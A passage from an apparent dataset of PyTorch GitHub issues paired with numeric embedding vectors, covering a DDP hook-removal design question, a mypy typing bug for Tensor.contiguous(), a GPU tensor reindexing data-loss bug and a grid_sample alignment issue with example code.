I feel the best way would be deleting those hooks from model variables when destructing a `Reducer`, but I didn't find a clean way to do that. The [`add_post_hook`](https://github.com/pytorch/pytorch/blob/fa4ca4e70e98fbe944d1435929ea4fd17c7bed7d/torch/csrc/autograd/function.h#L250) function takes unique parameters, and we can get those hooks through [`post_hooks`](https://github.com/pytorch/pytorch/blob/fa4ca4e70e98fbe944d1435929ea4fd17c7bed7d/torch/csrc/autograd/function.h#L254). Directly looping through the the hooks vector and find the target to delete seems to be too hackish.

#### Solution 3: Create New Variables (?)

Not sure if this can work. Instead of creating replica (as in Solution 1), let DDP create a new variable for every parameter in the original module. All DDP forward and backward pass will use those new variables. I think this won't work if the application only wraps part of the model using DDP, because there will be two disjoint autograd graphs (?)


@soumith @gchanan @ezyang  thoughts?
",True,"[-3.92609835e-01 -5.69798872e-02 -8.79198909e-02 -2.82213449e-01
 -9.20934677e-02 -2.14134827e-01  2.01013356e-01  1.27658740e-01
 -5.33850968e-01 -2.10233629e-02  1.91896856e-01  1.10946782e-01
  1.65625691e-01  1.45839617e-01 -1.29657120e-01  1.76314443e-01
 -1.94416508e-01 -2.00172365e-01  1.23780444e-02  1.52990669e-01
  1.75756276e-01 -3.30399312e-02 -6.31573051e-03  1.67355269e-01
 -1.12401620e-01  9.86406058e-02  4.48065065e-02 -1.49783641e-01
  2.71072984e-01 -1.94949299e-01  2.48888612e-01  9.09122378e-02
 -5.41784644e-01  1.24769308e-01  2.62006044e-01  1.62272394e-01
 -1.63929030e-01 -1.77255079e-01  9.27782506e-02 -2.12184131e-01
  1.51593179e-01  9.13962573e-02 -1.09064460e-01 -4.38135192e-02
 -1.98019862e-01 -3.41915071e-01 -1.98433310e-01  9.29776877e-02
 -1.39587298e-01 -4.38027114e-01  4.09416914e-01  2.04363018e-01
  2.84810010e-02 -2.21931189e-01 -7.59511627e-03 -1.67979687e-01
  5.60227036e-02  3.58067036e-01 -2.35107653e-02 -1.76383451e-01
  1.91278495e-02  1.05866864e-01 -2.35920593e-01  5.39092496e-02
  2.96075732e-01  1.29623562e-01 -6.46145642e-02 -7.27490336e-03
  4.49918270e-01 -3.80462371e-02  2.75888771e-01  2.10349828e-01
 -4.47765648e-01  9.76875946e-02  4.37180027e-02  1.23055968e-02
 -2.14821115e-01 -8.56168941e-02 -1.39214005e-02 -5.96584156e-02
  1.00079952e-02  1.74330279e-01  2.51286514e-02  1.77013040e-01
 -5.85983135e-03 -3.39109272e-01  5.04828915e-02 -2.07876600e-02
  7.01305747e-01  5.80772385e-02 -2.02175276e-03  3.02000374e-01
 -3.08899134e-01  3.72791260e-01 -1.35608055e-02  1.41136393e-01
  1.35036096e-01 -2.24829674e-01  4.62692119e-02  9.00509879e-02
 -3.62901464e-02 -3.46252263e-01 -3.61749262e-01 -7.79844001e-02
 -1.61721438e-01 -2.10283548e-02  1.21752024e-01 -1.07089214e-01
  2.18215823e-01  5.03457226e-02 -1.72420666e-01 -1.08699746e-01
  4.36604023e-06  7.03854561e-02  1.40844494e-01  2.63431728e-01
 -1.58528522e-01  1.29401714e-01 -2.76677161e-01 -1.51724130e-01
 -2.90921926e-01 -1.90805122e-02  1.12475723e-01  2.15148211e-01
  2.90299028e-01  4.73830909e-01  1.94079325e-01 -1.55940235e-01
 -1.16303325e-01 -1.82844311e-01 -4.33882847e-02  1.94588989e-01
 -5.25788404e-02  9.74039659e-02  5.13263226e-01  3.33349615e-01
 -2.80611455e-01 -4.32922482e-01 -1.11667223e-01 -1.04813822e-01
 -2.19991371e-01 -3.06381941e-01  8.36224705e-02 -4.15856242e-01
  2.70998120e-01  9.28805023e-02 -3.18095267e-01  2.62973368e-01
 -8.70747268e-02  2.24011987e-01  3.72744203e-01  1.68867372e-02
 -3.77293825e-01  3.34107094e-02  2.83894408e-02  3.57522637e-01
  6.92953229e-01 -2.59145260e-01  1.74981296e-01 -6.23612925e-02
 -1.53904110e-01  3.67025435e-01 -2.14509591e-02  2.96222031e-01
 -1.54372063e-02 -2.40592733e-02 -3.06102484e-01 -1.17347173e-01
 -1.79233283e-01 -1.16982445e-01 -2.47051194e-02 -1.85295999e-01
 -3.11918378e-01 -4.86432500e-02  2.97616217e-02 -2.65852392e-01
 -1.28313512e-01 -2.57956415e-01 -6.51616007e-02  2.35024422e-01
  2.27691144e-01  2.22608864e-01  1.47706449e-01  1.05249390e-01
  2.78599322e-01  3.39205921e-01  2.32007757e-01  9.95240435e-02
  5.30243590e-02 -1.90005481e-01 -4.52827692e-01 -3.51703539e-02
  5.29263139e-01 -1.76833600e-01 -4.17999700e-02 -1.03628919e-01
  2.06830025e-01 -8.30729455e-02  1.69922724e-01 -8.48421156e-02
  7.76366591e-02  1.84735898e-02 -5.29686064e-02 -1.51142869e-02
  1.28342479e-01  1.88012019e-01 -2.30369627e-01 -2.85972089e-01
  1.24711119e-01 -9.32721887e-03 -1.61079556e-01 -4.28466290e-01
 -2.30526209e-01 -4.03543651e-01 -3.23913157e-01 -7.18152225e-02
  3.04361433e-01  1.93113968e-01 -1.40224304e-03 -1.38332635e-01
  5.88527061e-02  1.61184609e-01 -9.11212713e-02 -5.27161965e-03
 -1.85120955e-01  2.38821432e-01 -2.02424265e-02 -1.07897684e-01
  2.10457761e-02 -1.09896138e-01 -3.37866724e-01  4.82477993e-03
  5.01789272e-01 -3.78245488e-04 -8.35225433e-02 -1.41458467e-01
  1.13398336e-01 -3.42959240e-02 -3.50763768e-01  1.06652848e-01
 -1.58510312e-01 -1.32094264e-01 -5.86840604e-03 -1.45674750e-01
  5.56923226e-02  4.02643621e-01 -4.55521345e-01  1.19365707e-01
 -2.74453104e-01  1.12410821e-01 -2.20893115e-01 -5.99200651e-02
  2.07779378e-01 -2.42575303e-01  5.19853234e-01 -1.03017181e-01
  6.42248988e-02 -5.88248149e-02 -8.89706835e-02 -3.49651873e-01
  7.48073906e-02  2.61463672e-01 -1.12462252e-01  2.74112016e-01
 -1.93297565e-02 -1.51651561e-01 -3.28631848e-01 -1.77597553e-01
  2.68711150e-01 -3.96403968e-01  1.64877981e-01 -5.08893847e-01
  2.59739578e-01  2.86651075e-01  9.54409763e-02 -1.82683825e-01
  3.76067191e-01 -3.01551700e-01  3.53860497e-01 -5.78621477e-02
  3.45272660e-01  2.05810279e-01 -1.84700519e-01 -1.29837785e-02
 -6.16561808e-03 -9.92904305e-02  1.36683315e-01 -1.23543534e-02
 -4.58072543e-01  7.64392465e-02 -2.04431176e-01  1.51498944e-01
  2.73244649e-01  1.10086977e-01 -1.48667663e-01  1.96871966e-01
  1.74443960e-01 -1.14994638e-01  2.23389447e-01 -4.29127306e-01
 -2.94038117e-01  9.22569856e-02 -4.87320647e-02  1.56711452e-02
  6.51657879e-02 -2.17876732e-01  1.36393458e-01 -1.36230558e-01
  3.32516104e-01 -4.77535665e-01  4.49591547e-01 -2.86312878e-01
 -1.41743362e-01  2.85868466e-01 -8.03988352e-02 -5.00339046e-02
 -1.16121560e-01  5.06590903e-01  3.80802929e-01  2.19328195e-01
  4.87879328e-02 -8.25663358e-02 -1.73614800e-01 -4.21900079e-02
  3.77409995e-01  1.22825421e-01  7.43247569e-02  1.49471954e-01
  1.69638917e-02 -1.57510132e-01 -2.58596450e-01 -6.28867075e-02
 -1.67124450e-01  4.60199602e-02 -1.22774124e-01 -1.85369715e-01
 -3.52914244e-01  3.35660368e-01 -1.29242092e-01 -1.61466479e-01
  2.59924494e-02 -1.32617623e-01 -8.13293159e-02 -1.51579976e-01
 -1.14174940e-01  1.51469648e-01  1.69463634e-01  1.22635603e-01
 -1.95533186e-01 -2.15431720e-01  1.45012811e-01 -1.42058343e-01
 -1.65635541e-01  1.70517296e-01  7.26400912e-02  3.89089227e-01
  1.50848389e-01  3.29670496e-02  2.35872418e-01  5.65541208e-01
 -2.59016454e-01  3.18478346e-01 -1.59405664e-01 -1.62772462e-02
  4.15007509e-02  1.00752652e-01 -3.26802015e-01  1.80806354e-01
  1.12090304e-01  1.19696654e-01 -2.55988806e-01  1.58051923e-01
 -3.55692238e-01  6.94341436e-02  1.85556352e-01  2.59220690e-01
  1.68329496e-02  1.47908807e-01 -1.30094200e-01 -1.21757664e-01
 -1.38319701e-01 -9.77962464e-02  3.62485290e-01  4.40987647e-02]"
Use of Tensor.contiguous() unconditionally results in Mypy linting errors high priority module: typing triaged small,"## ðŸ› Bug

In `tools/pyi/gen_pyi.py` there is no type hint provided for `Tensor.contiguous()` (`Tensor.is_contiguous()` is there however).  As a result uses of `.contiguous()` cause Mypy linting errors.  

In the case I had the line (the context and details of the tensors doesn't matter):

```
re_batched = seq_first.contiguous().view(expanded_tokens.size(1), -1).transpose(0, 1)
```

gives the linting error:

```
error: ""Tensor"" has no attribute ""contiguous""; maybe ""is_contiguous""?
```

## To Reproduce

Any use of `Tensor.contiguous` will produce this when linted with MyPy

## Expected behavior

No error should be reported

## Environment

PyTorch Version (e.g., 1.0): 1.1.0
OS (e.g., Linux): MacOS
How you installed PyTorch (conda, pip, source): conda
Build command you used (if compiling from source): N/A
Python version: 3.6
CUDA/cuDNN version: N/A
GPU models and configuration: None
Any other relevant information: None",True,"[-0.20779397 -0.3404343  -0.28414458 -0.21227084  0.26240826 -0.3185854
 -0.08453961 -0.00703622 -0.02054361 -0.4248896   0.17306533  0.20904252
  0.11227299  0.2577395   0.20431387  0.19576019  0.08779445 -0.12373509
 -0.36112657 -0.02687512  0.09293003  0.11777139 -0.14112663 -0.01037419
 -0.04506576 -0.14903852 -0.04953035 -0.19515401  0.46900225  0.03006407
  0.07991451  0.27487794 -0.36877236  0.1858156   0.30594045  0.26514077
 -0.32987946 -0.1097785   0.05759808  0.05013561  0.07568393 -0.07575823
  0.18361636 -0.30569237 -0.08367949 -0.18213788  0.02906979  0.15175286
 -0.23074023 -0.0144128   0.029371    0.28376055 -0.19222797 -0.15106082
 -0.23658407  0.20765164 -0.04202188 -0.10636515 -0.3696896  -0.3428192
  0.31616595  0.25038764 -0.01893643  0.28435737  0.07523905  0.03610669
  0.44744337  0.21467997  0.4969478   0.1880384   0.45827255  0.09054926
 -0.6853439   0.26330435  0.3568501   0.22094904 -0.11294319  0.3046509
  0.09253405 -0.32555473 -0.24563971  0.06810093  0.19536288 -0.3201661
  0.02296567 -0.25400394  0.2883912   0.19629031 -0.0414345  -0.43982354
  0.5550846  -0.14571244 -0.23443702  0.17140666  0.18629703  0.11164358
  0.02485816  0.2912985  -0.14586443 -0.28425574 -0.4855044   0.00271515
 -0.22365747  0.27381694 -0.04060158  0.16927163 -0.12341735  0.04815596
  0.10794555  0.10925566  0.28088546 -0.23547146  0.44516066  0.02482517
  0.16233408 -0.36681914  0.07358615  0.1548321   0.06938757  0.27315962
 -0.1967349  -0.10919753 -0.09058328  0.40585223  0.07425088  0.12333849
  0.10456938 -0.10943059  0.3507649  -0.28130037  0.18084225 -0.24009857
 -0.20541821  0.2807166   0.15516272 -0.25698692 -0.2615462  -0.10962681
 -0.24382523  0.211419   -0.01705962 -0.11386482  0.04520068 -0.17278244
  0.27815497  0.08551684 -0.12069489 -0.20561334 -0.06763023  0.32138747
 -0.17785716  0.16595691 -0.25721514 -0.2397781  -0.03675576 -0.02743366
  0.01776949 -0.10600113 -0.33457315 -0.37185574  0.20902222  0.5913475
  0.13220742  0.31576842 -0.06759501  0.11294793 -0.2602484  -0.2533124
  0.03309067 -0.00889653  0.10621136 -0.21420789 -0.01783813  0.04001588
  0.15009081  0.11191569 -0.19731756 -0.52490485 -0.16442263  0.20347196
  0.21887982  0.05258623 -0.1528264  -0.0391297   0.08110084 -0.05100926
  0.05494154  0.2183286  -0.28938416 -0.08945112  0.06527353 -0.30654836
  0.08114218 -0.20172253  0.15782186 -0.20629987  0.5356926  -0.1957115
 -0.06226544 -0.04649616  0.04097142 -0.02338928  0.09420995 -0.06857932
  0.21191795 -0.33370697 -0.09367086 -0.16304669 -0.36027837  0.1657079
 -0.08411333  0.08088791 -0.12115966 -0.21804006 -0.20273769  0.25376943
 -0.02338257 -0.04139313  0.10634391 -0.09228337  0.26335323  0.03230773
  0.0831862  -0.26651174  0.17783388  0.02452143  0.1304671   0.14273524
 -0.05074466 -0.21100196  0.11517362  0.11459483 -0.02202398  0.03023183
  0.08868864 -0.05004857  0.45057172 -0.16805777 -0.17744425  0.29852742
 -0.49843368 -0.18270375  0.11960194  0.28951085  0.09922422 -0.21190596
  0.04994425 -0.02147256 -0.26044828  0.12115557 -0.6298955  -0.18456438
 -0.01883763 -0.13077837  0.2665714  -0.23666474 -0.1613741  -0.13402562
 -0.09734158 -0.12626064  0.36183542  0.0415244  -0.10520408  0.2618677
  0.15582451 -0.01594568 -0.38723373  0.27272     0.29350787 -0.29457933
  0.06657701 -0.21334684 -0.05663381 -0.22278142  0.04660981  0.24297749
  0.5590823   0.06941161  0.09325692  0.12378289 -0.1005219   0.4156487
 -0.3902883   0.26862735  0.26642036  0.0076035  -0.01817858  0.01419881
 -0.17333016 -0.18257597 -0.2604506   0.0401923  -0.40399313  0.06906956
 -0.07703485  0.37555793  0.26028246 -0.29097474  0.5107101  -0.04130961
  0.0116732  -0.11905149  0.14951606 -0.10760525 -0.3467735  -0.17985949
  0.14860694  0.12307346  0.1051631  -0.38098532  0.5644922   0.11946207
  0.18380073  0.2347149   0.03013729  0.06877109  0.11356063  0.87545395
  0.45664483  0.2316453  -0.03588733 -0.18876928 -0.41252393 -0.45231482
  0.39445072  0.09482706 -0.03616461  0.04795881 -0.0987045   0.3727437
  0.20274463 -0.31022838 -0.3951543  -0.15033439 -0.28210905 -0.1541502
 -0.13744953 -0.09123518  0.05823648  0.09058255 -0.06820434  0.07667288
 -0.23683219 -0.21034247  0.07173829 -0.25208738 -0.09123047  0.35479236
  0.05888355 -0.33898973 -0.10892866  0.01305544 -0.17914486 -0.08423475
  0.02513893  0.4305206   0.08137228  0.01206894 -0.21623994  0.04583475
 -0.19761032  0.01524257 -0.01835019 -0.0710687   0.51049477 -0.27768895
 -0.07910144 -0.01410916  0.02266613  0.17731582 -0.48469812  0.23153211
  0.00867623  0.14768991  0.3437384  -0.4624967  -0.3940073   0.4147171
  0.07893442 -0.02270895 -0.3285803   0.2057401   0.23268503  0.01001473]"
Reindexing a huge tensor to shuffle it results in data loss at the end of the tensor triaged,"## ðŸ› Bug

Shuffling a huge tensor by reindexing into it results in all of the values past a certain point being set to 0 when the reindexing is done in GPU memory.

@colesbury  This likely relates to https://github.com/pytorch/pytorch/issues/20562 as the issue is also with reindexing and also shows up at the same point in the tensor.  Hopefully this helps with narrowing the other issue.

I initially thought this was limited to longtensors, but if you use a floattensor with 2x values you run into the exact same issue in the exact same place. 

## To Reproduce

Steps to reproduce the behavior:

1. Create a huge longtensor (>536870700 values) of random values.  I went with 15Mx45
2. Load it into gpu memory
3. Reindex to shuffle the values

Data past ~536870700 will be all 0.  The data is zero'd mid tensor.

Here's a notebook that reproduces the issue:
https://github.com/EvenOldridge/HugeTensor/blob/master/Huge%20Tensor%20Bug%20-%20Data%20Loss.ipynb

## Expected behavior

Data should not be lost when reindexing

## Environment

- PyTorch Version (e.g., 1.0): 1.01
- OS (e.g., Linux): Linux (Ubuntu 16.04)
- How you installed PyTorch (conda, pip, source): pip
- Python version: 3.6
- CUDA/cuDNN version: 10.0
- GPU models and configuration: TeslaV100 32 Gig (on a DGX-1)
",True,"[-4.71499652e-01 -3.74739468e-01 -2.95847118e-01 -6.83363676e-02
 -1.55288517e-01 -3.48027259e-01  2.48440534e-01 -1.87236950e-01
  1.08032495e-01 -9.73816290e-02 -4.06107903e-02  5.95714688e-01
 -2.78869390e-01  3.15427989e-01 -4.11390364e-01  2.40512148e-01
 -6.29209518e-01  1.36803150e-01 -1.91188261e-01 -7.95642287e-02
 -8.61535519e-02 -1.01414107e-01 -3.97215247e-01  1.77891523e-01
  1.54589070e-02  1.24592364e-01  1.97473079e-01 -3.30409080e-01
  2.26192147e-01 -4.08199430e-02  3.17249656e-01  4.57453310e-01
 -1.32442757e-01 -7.98816755e-02 -4.71879989e-01  3.98399323e-01
 -3.89313459e-01 -1.94451794e-01  7.84030110e-02  1.69379964e-01
  2.65531272e-01  1.58124864e-01  2.90220678e-01  1.24128059e-01
  1.80795997e-01  1.66002363e-01  2.89483927e-02  1.36726081e-01
 -5.21141626e-02  8.86066407e-02  3.67558971e-02  1.58480331e-01
 -3.19616795e-01 -6.24197423e-02 -4.23341021e-02  2.42999569e-02
  1.88190699e-01 -2.11579099e-01  1.48547456e-01 -2.12861970e-03
  1.60984509e-02 -1.00139588e-01  1.10132873e-01 -8.78327526e-04
 -4.32220101e-03 -2.07596511e-01  4.31466550e-01 -2.68983305e-01
  4.63044703e-01  9.23094526e-02  1.95337221e-01  1.59058750e-01
 -3.69899154e-01  3.94131243e-03  2.05961406e-01  5.66643402e-02
 -9.00517255e-02  2.80585229e-01  4.11555290e-01  1.60393119e-02
  7.45566189e-03  1.02316123e-02  2.55576819e-01 -4.91202354e-01
  1.38955116e-01 -1.34373596e-03  2.84270465e-01 -5.02841547e-02
  4.74051714e-01 -2.57597774e-01  4.44156528e-01 -7.84602016e-02
 -2.55256891e-01 -1.31248817e-01  2.67367661e-01  3.16066206e-01
  1.35273367e-01  1.51565313e-01  1.90525472e-01 -3.03414017e-02
 -7.34595805e-02  1.24883100e-01 -4.87309933e-01  4.19493824e-01
 -1.24159239e-01  1.04483768e-01  1.16055764e-01 -3.02732326e-02
  6.35087192e-02  2.90606096e-02  8.91090259e-02 -1.82345420e-01
  5.05852520e-01  3.65818530e-01 -8.53798240e-02  8.79838467e-02
  6.22352697e-02  2.48795435e-01  1.23664029e-01  3.76631409e-01
 -4.48643267e-01 -1.20112076e-01 -8.24694335e-02  3.23016226e-01
  7.59500265e-02  4.00606930e-01 -2.16779023e-01 -5.74970543e-02
  1.06025979e-01 -2.48073339e-02  1.43657565e-01 -1.29468352e-01
 -2.27066338e-01 -4.58447337e-02 -2.62220383e-01 -2.49961466e-01
 -6.80411980e-03 -1.96498722e-01 -4.22625542e-01  1.26509905e-01
  2.99928844e-01 -1.24263139e-02 -2.14794889e-01 -2.79373497e-01
  2.51344472e-01  3.21005911e-01 -2.22819343e-01 -2.47966543e-01
 -7.19133392e-02  1.88520074e-01 -2.29114041e-01 -2.77037174e-02
 -2.69943714e-01  1.02449015e-01 -4.85366285e-02  1.52497455e-01
  4.03099716e-01 -1.58815309e-01 -2.70861328e-01 -2.87314951e-01
  2.90595554e-02  2.27422833e-01 -1.37674222e-02  1.28929600e-01
  4.99268711e-01  1.28575534e-01 -1.57505095e-01 -1.09022103e-01
 -2.87699066e-02  1.80949718e-01 -2.64293432e-01 -1.71308607e-01
 -3.72686863e-01  2.41502691e-02  5.56863308e-01 -3.23205367e-02
 -1.07930876e-01 -7.90891826e-01 -1.07071169e-01  2.19038334e-02
 -1.04937311e-02 -2.00694706e-02  2.61034042e-01 -1.05588049e-01
  1.16172016e-01 -7.55895674e-02  2.06681445e-01  1.37925059e-01
 -2.14435786e-01 -6.23132326e-02 -2.04115421e-01 -1.84173197e-01
  4.93616089e-02 -1.80187225e-01  6.19462766e-02 -8.87334570e-02
 -1.44511815e-02  5.22524677e-02 -1.32697687e-01  3.39137971e-01
 -5.00089712e-02 -3.71972412e-01 -4.81654964e-02 -5.13932258e-02
 -5.23534566e-02 -2.60257781e-01 -3.23749393e-01 -5.74164867e-01
 -2.51175344e-01  1.71391457e-01  9.24689993e-02 -4.27232623e-01
  5.87349571e-02 -1.63742512e-01 -4.34151381e-01 -4.96367179e-03
 -9.95758176e-02 -1.93441406e-01 -2.86454439e-01  2.28483975e-01
  2.55454898e-01  8.05136487e-02  1.64009124e-01 -1.71980023e-01
 -7.49536514e-01 -1.11428440e-01 -2.28941441e-01  7.81007856e-03
 -2.77195662e-01  2.20437944e-01  2.56909817e-01  1.63835913e-01
  2.62591004e-01 -3.08892608e-01 -3.56531702e-02 -9.79574770e-02
 -1.26263440e-01  1.14055395e-01  5.91023304e-02  5.13031706e-02
 -2.78978378e-01  2.65092403e-02 -1.27904713e-01 -8.62508267e-02
 -1.08545363e-01  3.96825284e-01 -2.83155441e-01  4.57381569e-02
 -1.76021069e-01  1.92699075e-01  2.82540530e-01 -6.06493056e-02
  2.93493152e-01  6.65370449e-02  1.65539145e-01 -4.23122078e-01
  5.69146983e-02  7.83969164e-02  4.93248031e-02 -9.88565236e-02
  3.56588483e-01  3.99817228e-02  7.42236301e-02  8.21357250e-01
  2.64620572e-01  3.53369653e-01 -1.07144654e-01  3.05240273e-01
  2.02198625e-01 -2.04572946e-01 -2.73433924e-01  2.70062923e-01
  2.15942979e-01 -2.59532034e-01  9.14354026e-02  1.37395198e-02
  4.58067745e-01  6.82210252e-02 -3.65398198e-01  1.63646847e-01
 -5.90233430e-02  2.64779598e-01 -1.11132473e-01  2.71934390e-01
 -3.23627591e-01 -9.46093798e-02  1.08850803e-02 -3.80400658e-01
  1.01843387e-01  1.37237668e-01 -3.44294369e-01 -1.35908410e-01
  3.51651222e-01 -5.14908228e-04  1.57635808e-01  3.54686499e-01
 -1.90018550e-01 -7.53199384e-02  8.08356404e-02  9.59521085e-02
  1.47165686e-01  5.45852371e-02  1.67397320e-01 -2.02733919e-01
 -2.29862839e-01  4.02321219e-02  2.73806334e-01  5.66527471e-02
 -1.10136852e-01  3.79257128e-02  1.32065594e-01 -1.70991153e-01
  1.16670825e-01  3.23419794e-02 -5.07773496e-02 -1.81365132e-01
 -3.13847363e-02  3.59906793e-01  2.96040148e-01  1.03617191e-01
 -9.39566195e-02 -3.53515804e-01 -2.96785515e-02  2.01388896e-01
  1.93860412e-01  2.08917260e-03  2.48845652e-01  1.67891264e-01
 -3.11546206e-01  5.86634725e-02 -1.17651656e-01 -2.99866259e-01
 -1.13416746e-01  9.28743109e-02  1.70933396e-01 -2.80242823e-02
 -9.82244760e-02  5.76666035e-02 -5.74032068e-02 -2.84329712e-01
 -2.87204355e-01 -3.88529524e-02  2.56876707e-01 -2.45736271e-01
 -1.27946824e-01 -4.09818590e-01  3.79401207e-01  5.97129881e-01
 -9.64956954e-02 -2.41189137e-01 -3.90701443e-01  1.27519332e-02
 -5.10907248e-02  2.80127406e-01  1.21936858e-01  3.79922092e-01
 -5.51487356e-02  8.05014893e-02  9.43098404e-03  3.45038176e-01
 -2.93633938e-01 -1.14397705e-01 -3.14170480e-01  2.39894569e-01
  2.23023649e-02 -3.48937899e-01  6.91537857e-02 -3.94646347e-01
  2.84649879e-01  1.97209522e-01  7.79929850e-03  4.35354471e-01
  5.17500713e-02  2.44492337e-01  3.48648757e-01 -1.76298305e-01
 -3.64117920e-01  4.91016805e-02 -2.84991413e-01 -1.21102236e-01
 -3.60019118e-01  1.19519949e-01 -2.22983494e-01 -2.57513374e-02]"
grid_sample is not aligned triaged module: vision,"`F.interpolate` has been changed to use `align_corners=False` by default, which is also the pixel model used by opencv/PIL, etc.

The input to `grid_sample` is in range `[-1, 1]`, and therefore should ideally be scale-invariant.
However, `F.grid_sample` still uses the old pixel model: https://github.com/pytorch/pytorch/blob/65b00aa5972e23b2a70aa60dec5125671a3d7153/aten/src/ATen/native/cuda/GridSampler.cu#L161-L162, and as a result it is not properly aligned under the scaling of `F.interpolate(align_corners=False)`. 

Examples:

```python
import torch
from torch.nn import functional as F

def grid_sample_v2(input, grid):
    # grid: [-1, 1]
    N, C, H, W = input.shape
    gridx = grid[:, :, :, 0]
    gridy = grid[:, :, :, 1]
    gridx = ((gridx + 1) / 2 * W - 0.5) / (W - 1) * 2 - 1
    gridy = ((gridy + 1) / 2 * H - 0.5) / (H - 1) * 2 - 1
    newgrid = torch.stack([gridx, gridy], dim=-1)
    return F.grid_sample(input, newgrid)

N = 500
input = torch.rand(N, 1, 32, 74)
input2 = F.interpolate(input, scale_factor=5, align_corners=False, mode='bilinear')

grid = torch.rand(N, 18, 17, 2) * 1.8 - 0.9  # use coordinates in -0.9, 0.9 to avoid boundary effects

output = F.grid_sample(input, grid)
output2 = F.grid_sample(input2, grid)
diff = torch.abs(output2 - output)
print(""DIFFv1:"", diff.mean())

output = grid_sample_v2(input, grid)
output2 = grid_sample_v2(input2, grid)
diff = torch.abs(output2 - output)
print(""DIFFv2:"", diff.mean())
```
The above code, when run with `align_corners=True`, prints:
```
DIFFv1: tensor(0.0032)
DIFFv2: tensor(0.0675)
```
when run with `align_corners=False`, prints:
```
DIFFv1: tensor(0.0689)
DIFFv2: tensor(5.3741e-07)
```
In the example, I provide a new implementation of `grid_sample`, which leads to smaller reconstruction error when `align_corners=False`. Given that `align_corners=False` is now the default for `interpolate`, similar options should be built into `grid_sample` as well.",True,"[-2.50308573e-01 -2.02591360e-01 -2.86420405e-01 -9.28745940e-02
  2.25782081e-01 -1.10677004e-01  3.86649594e-02  1.26716658e-01
 -3.36386085e-01 -1.31412104e-01 -3.76259163e-02 -1.26954466e-01
  2.37435699e-01  1.08555801e-01 -2.48730391e-01  8.92743617e-02
 -1.21371441e-01 -2.14640141e-01  6.75896257e-02 -3.65433916e-02
 -1.94620848e-01 -2.61264712e-01 -1.66821569e-01  7.13382885e-02
  1.65211663e-01 -2.66872440e-02  6.93695694e-02  2.61543058e-02
  4.05382477e-02 -3.18348892e-02  1.24785125e-01  5.45609593e-01
 -3.90448794e-03  1.18295714e-01 -1.17352335e-02  7.94183984e-02
 -6.28518388e-02 -1.14804022e-01 -4.08106208e-01 -8.77398551e-02
  1.42027646e-01  1.16904378e-01  2.55267382e-01 -5.22220433e-02
  2.39102006e-01  1.06545351e-02 -7.43799508e-02  1.75695673e-01
 -1.50364429e-01  1.47506341e-01 -3.23664755e-01 -8.73359442e-02
 -1.80162579e-01 -2.55755395e-01  4.79077473e-02  2.57947743e-01
  1.00361973e-01 -2.18977019e-01  5.99508137e-02  1.21360198e-01
  1.32093549e-01  3.60279903e-02  9.12441760e-02  2.11701244e-01
  1.12257205e-01  4.25361060e-02 -2.81754192e-02 -2.61391133e-01
  2.10379511e-01 -5.31460494e-02  1.58466876e-01 -6.44190907e-02
 -1.52963534e-01 -2.31046125e-01  1.04206055e-01 -1.34885749e-02
 -3.54159892e-01  1.35044545e-01  7.18188584e-02 -1.92514300e-01
  9.45659056e-02  1.93597287e-01  2.47388899e-01  8.84846598e-02
  1.60671204e-01 -2.87602454e-01 -1.48676056e-03 -7.15171359e-03
 -1.04991853e-01  2.00562552e-02  4.96456593e-01  4.91619647e-01
 -2.27631941e-01  3.31736118e-01  8.19894969e-02  2.56690800e-01
  8.10195506e-02 -2.60012299e-01  1.98156714e-01 -2.20202699e-01
 -1.52078092e-01 -1.65462837e-01 -2.21674405e-02  4.32157695e-01
  1.80221424e-02 -1.36305034e-01  1.12255901e-01  2.72331595e-01
  8.22654665e-02  2.09372163e-01  1.05503187e-01 -1.61895514e-01
 -1.11264266e-01 -8.70901346e-02  1.90809846e-01 -2.34205529e-01
  1.06147893e-01 -7.87076280e-02 -1.44584216e-02 -5.86770475e-02
 -2.94887125e-01  1.63138807e-01  1.45911157e-01 -1.67519361e-01
  3.90028000e-01  8.87803435e-02 -1.81242257e-01  1.45057011e-02
 -1.16252806e-04  2.41263937e-02  1.29907981e-01  1.88410252e-01
  1.26141161e-02 -2.15105228e-02 -9.78920981e-02  4.54227403e-02
  4.87327389e-02  1.94173247e-01 -1.41285330e-01  2.73021400e-01
  1.03055082e-01  3.07883263e-01  5.01299873e-02  2.91552898e-02
 -7.47592188e-03  6.87430725e-02 -4.78809237e-01  2.76462920e-02
 -7.98539370e-02 -2.79730737e-01  7.76665360e-02  1.78140104e-01
 -2.07486063e-01  3.72206390e-01 -1.35475211e-02  4.20349151e-01
 -7.24116266e-02  7.37889409e-02  1.45869240e-01 -2.00672373e-01
 -4.92142513e-02  1.87604591e-01 -1.73261285e-01 -1.24799699e-01
  2.66270131e-01  1.52984902e-01 -1.96309566e-01 -4.07098159e-02
 -1.59960333e-02  9.37502831e-02  3.99179697e-01 -2.57479578e-01
  9.10719186e-02 -1.18784592e-01  2.34584913e-01 -6.79142773e-02
 -1.84721515e-01  1.27728194e-01  9.00784358e-02  1.06400251e-03
  2.55991220e-01  7.13476315e-02  2.88470276e-02  1.44271642e-01
 -3.44823189e-02  1.50757283e-01  2.13596627e-01 -6.19544089e-02
 -3.22160423e-01  1.27142705e-02 -2.84826934e-01 -2.21965775e-01
  2.23053664e-01  1.48545966e-01 -8.53565931e-02 -8.56022537e-03
  2.05245405e-01  1.03706591e-01  2.56475896e-01 -1.98288616e-02
 -1.88655913e-01  6.32810071e-02  1.34984747e-01 -7.26534501e-02
 -4.13525440e-02 -7.83981830e-02  1.06100410e-01 -2.29423493e-01
 -2.13154450e-01  2.68692911e-01 -1.06375456e-01 -3.47947717e-01
 -2.79173374e-01 -1.45658433e-01  1.87147975e-01  1.46307409e-01
 -7.66685009e-02 -4.69304323e-02 -4.64854240e-01  2.13365734e-01
  1.34153336e-01  9.70088318e-03 -7.62825087e-03 -2.35551059e-01
 -2.34689444e-01  8.37211683e-02  9.70379412e-02 -5.89899719e-04
 -1.56626016e-01  1.40088484e-01  1.60245016e-01 -9.00005102e-02
  2.84514844e-01  9.13783256e-03  1.59817003e-02 -7.03238621e-02
  8.17423463e-02 -2.04371270e-02 -5.35984300e-02 -3.21913734e-02
 -2.00400904e-01 -1.65715009e-01 -4.39108862e-03 -3.64199504e-02
  9.02303755e-02 -2.85361648e-01  1.26222298e-01  1.91931427e-01
  8.36894009e-03  5.91732040e-02 -1.89409882e-01 -4.00052160e-01
  2.56508470e-01  6.75596744e-02 -3.39122355e-01 -2.78480779e-02
  1.72971770e-01 -1.16955556e-01  1.27874181e-01  7.38337040e-02
 -7.59872273e-02  7.89798051e-03 -1.74069524e-01  4.15549964e-01
